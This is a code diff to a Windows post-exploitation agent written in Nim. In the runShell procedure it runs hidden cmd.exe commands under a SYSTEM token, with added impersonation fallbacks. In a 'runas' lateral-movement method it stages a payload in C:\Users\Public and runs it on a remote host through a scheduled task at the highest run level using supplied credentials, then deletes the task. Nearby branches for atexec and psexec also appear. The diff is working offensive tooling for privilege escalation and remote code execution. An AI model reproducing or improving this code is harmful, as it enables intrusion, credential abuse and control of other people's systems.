@@ -136,69 +136,9 @@ proc runShell*(cmd: string): string =
         discard enablePriv(gSystemToken, "SeIncreaseQuotaPrivilege")
         discard enablePriv(gSystemToken, "SeAssignPrimaryTokenPrivilege")
 
-        # ── T1: CreateProcessAsUserW + anonymous pipes ─────────────────────
-        # Does NOT go through seclogon — direct creation in caller's session,
-        # so pipe handles inherit correctly without STATUS_DLL_INIT_FAILED.
-        var sa: SECURITY_ATTRIBUTES
-        zeroMem(addr sa, sizeof(sa))
-        sa.nLength = DWORD(sizeof(sa)); sa.bInheritHandle = WINBOOL(1)
-        var hRead, hWrite: HANDLE
-        if CreatePipe(addr hRead, addr hWrite, addr sa, 0) != 0 and
-           SetHandleInformation(hRead, DWORD(1), 0) != 0:
-          let shellArgsP = "/d /c " & cmd & " 2>&1"
-          var si: STARTUPINFOW; zeroMem(addr si, sizeof(si))
-          si.cb = DWORD(sizeof(si))
-          si.dwFlags = DWORD(STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW)
-          si.wShowWindow = WORD(SW_HIDE)
-          si.hStdInput = 0; si.hStdOutput = hWrite; si.hStdError = hWrite
-          var pi: PROCESS_INFORMATION; zeroMem(addr pi, sizeof(pi))
-          let appW = newWideCString("C:\\Windows\\System32\\cmd.exe")
-          let cwdW = newWideCString("C:\\Windows\\System32")
-          var argsW = newWideCString(shellArgsP)
-          let procOk = CreateProcessAsUserW(gSystemToken, appW, argsW, nil, nil,
-            WINBOOL(1), CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi)
-          discard CloseHandle(hWrite)
-          if procOk != 0:
-            var output = ""
-            var buf: array[4096, byte]
-            let deadline = getTime() + initDuration(seconds = 60)
-            block drainLoop:
-              while true:
-                var avail: DWORD = 0
-                if PeekNamedPipe(hRead, nil, 0, nil, addr avail, nil) != 0 and avail > 0:
-                  var nr: DWORD = 0
-                  let want = min(avail, DWORD(buf.len))
-                  if ReadFile(hRead, addr buf[0], want, addr nr, nil) != 0 and nr > 0:
-                    var chunk = newString(int(nr))
-                    copyMem(addr chunk[0], addr buf[0], int(nr))
-                    output.add(chunk)
-                    continue
-                var exitCode: DWORD = DWORD(259)
-                discard GetExitCodeProcess(pi.hProcess, addr exitCode)
-                if exitCode != DWORD(259):
-                  var avail2: DWORD = 0
-                  while PeekNamedPipe(hRead, nil, 0, nil, addr avail2, nil) != 0 and avail2 > 0:
-                    var nr: DWORD = 0
-                    let want = min(avail2, DWORD(buf.len))
-                    if ReadFile(hRead, addr buf[0], want, addr nr, nil) == 0 or nr == 0: break
-                    var chunk = newString(int(nr))
-                    copyMem(addr chunk[0], addr buf[0], int(nr))
-                    output.add(chunk)
-                    avail2 = 0
-                  break drainLoop
-                if getTime() > deadline:
-                  discard TerminateProcess(pi.hProcess, 1)
-                  break drainLoop
-                Sleep(DWORD(10))
-            discard CloseHandle(hRead)
-            discard CloseHandle(pi.hProcess); discard CloseHandle(pi.hThread)
-            return output
-          discard CloseHandle(hRead)
-
-        # ── T2 fallback: CreateProcessWithTokenW + temp file ─────────────────
-        # Only reached if CreateProcessAsUserW failed (SeAssignPrimaryToken
-        # not available). Child writes its own output file — no pipe
-        # handle inheritance needed.
+        # Use the same stable token-launch path as the Go agent.  Redirecting
+        # in the child avoids anonymous-pipe inheritance problems across
+        # sessions and lets us validate the process exit/capture result.
         let uid = toHex(int64(GetCurrentProcessId()) xor int64(GetTickCount()), 16)
         let outPath = "C:\\Windows\\Temp\\sbo" & uid & ".tmp"
         let shellArgs = "/d /c " & cmd & " > \"" & outPath & "\" 2>&1"
@@ -214,18 +154,39 @@ proc runShell*(cmd: string): string =
           CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
         var withTokenErr: DWORD = if procOk2 != 0: 0 else: GetLastError()
         var asUserErr: DWORD = 0
+        var impersonateErr: DWORD = 0
         if procOk2 == 0:
           procOk2 = CreateProcessAsUserW(gSystemToken, appW2, argsAsUserW, nil, nil,
             WINBOOL(0), CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
           if procOk2 == 0: asUserErr = GetLastError()
         if procOk2 == 0:
+          # Last fallback for tokens that cannot be used directly by either
+          # primary-token API: impersonate SYSTEM on this thread and retry.
+          if ImpersonateLoggedOnUser(gSystemToken) != 0:
+            var retryW = newWideCString(shellArgs)
+            procOk2 = CreateProcessWithTokenW(gSystemToken, 0, appW2, retryW,
+              CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
+            if procOk2 == 0: withTokenErr = GetLastError()
+            discard RevertToSelf()
+          else:
+            impersonateErr = GetLastError()
+        if procOk2 == 0:
           return "[error: SYSTEM shell launch; WithToken=" & $withTokenErr &
-            "; AsUser=" & $asUserErr & "]"
-        discard WaitForSingleObject(pi2.hProcess, DWORD(60000))
+            "; AsUser=" & $asUserErr & "; Impersonate=" & $impersonateErr & "]"
+        let waitRes = WaitForSingleObject(pi2.hProcess, DWORD(60000))
+        var exitCode: DWORD = DWORD(259)
+        discard GetExitCodeProcess(pi2.hProcess, addr exitCode)
+        if waitRes == DWORD(WAIT_TIMEOUT):
+          discard TerminateProcess(pi2.hProcess, 1)
+          exitCode = 1
         discard CloseHandle(pi2.hProcess); discard CloseHandle(pi2.hThread)
         var output2 = ""
         try: output2 = readFile(outPath) except: discard
         discard DeleteFileA(outPath)
+        if output2.len == 0 and exitCode != 0:
+          return "[error: SYSTEM shell capture empty; exit=" & $exitCode &
+            "; WithToken=" & $withTokenErr & "; AsUser=" & $asUserErr &
+            "; Impersonate=" & $impersonateErr & "]"
         return output2
       let (output, _) = execCmdEx("cmd.exe /s /c \"" & cmd & "\"")
       return output
@@ -1483,21 +1444,32 @@ when defined(windows):
       if user != "": discard runShell("net use \\\\" & host & "\\IPC$ /delete 2>&1")
       return "[+] atexec → " & host & "\n    task: " & tn & "\n    cmd: " & cmd & "\n    runas: SYSTEM\n" & out2
     elif meth == "runas":
-      let tn = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
+      let tn = "svc" & toHex(GetCurrentProcessId().uint32 xor GetTickCount().uint32, 8)
       let ru = if user.startsWith(".\\") or user.startsWith("./"): user[2..^1] else: user
       # Copy to C:\Users\Public\ so the target user can read it
-      let baseName = cmd.split('\\')[^1]
+      let baseName = extractFilename(cmd)
+      if baseName == "": return "runas: payload path is empty"
       let pubPath = "C:\\Users\\Public\\" & baseName
       var effCmd = cmd
       if cmd != pubPath:
-        try: copyFile(cmd, pubPath); effCmd = pubPath
-        except: discard
-      var out2 = ""
-      out2.add(runShell("schtasks /Create /SC ONCE /ST 00:00 /F /TN " & tn &
-        " /TR \"\\\"" & effCmd & "\\\"\" /RU \"" & ru & "\" /RP \"" & pass & "\" 2>&1") & "\n")
-      out2.add(runShell("schtasks /Run /TN " & tn & " 2>&1") & "\n")
+        try:
+          copyFile(cmd, pubPath)
+          effCmd = pubPath
+        except:
+          return "runas: could not stage payload in C:\\Users\\Public"
+      if not fileExists(pubPath): return "runas: staged payload is not readable"
+      let createOut = runShell("schtasks /Create /SC ONCE /ST 00:00 /RL HIGHEST /F /TN \"" & tn &
+        "\" /TR \"" & effCmd & "\" /RU \"" & ru & "\" /RP \"" & pass & "\" 2>&1")
+      if createOut.toUpperAscii().contains("ERROR:") or createOut.toLowerAscii().startsWith("[error:"):
+        return "runas: schtasks /Create failed\n" & createOut
+      var out2 = createOut & "\n"
+      let runOut = runShell("schtasks /Run /TN \"" & tn & "\" 2>&1")
+      if runOut.toUpperAscii().contains("ERROR:") or runOut.toLowerAscii().startsWith("[error:"):
+        discard runShell("schtasks /Delete /TN \"" & tn & "\" /F 2>&1")
+        return "runas: schtasks /Run failed\n" & runOut
+      out2.add(runOut & "\n")
       Sleep(DWORD(3000))
-      out2.add(runShell("schtasks /Delete /TN " & tn & " /F 2>&1") & "\n")
+      out2.add(runShell("schtasks /Delete /TN \"" & tn & "\" /F 2>&1") & "\n")
       return "[+] runas → " & ru & " @ " & host & "\n    cmd: " & effCmd & "\n" & out2
     elif meth == "psexec":
       let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
